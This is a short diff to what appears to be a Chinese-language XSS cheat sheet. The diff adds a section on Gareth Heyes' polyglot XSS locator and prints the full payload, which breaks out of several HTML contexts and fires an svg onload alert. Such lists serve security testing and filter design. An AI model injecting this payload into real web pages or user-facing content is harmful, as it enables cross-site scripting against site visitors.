@@ -8,7 +8,11 @@
 
 ### 2.2. XSS 定位器(Polygot)
 
-如下是一个
+如下是一个`Polygot test XSS payload`，此测试将在多个上下文中执行，包括html，脚本字符串，js和url。感谢Gareth Heyes提出。
+
+```html
+ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+```
 
 ### 2.3. 使用 JavaScript 命令实现的图片 XSS
 
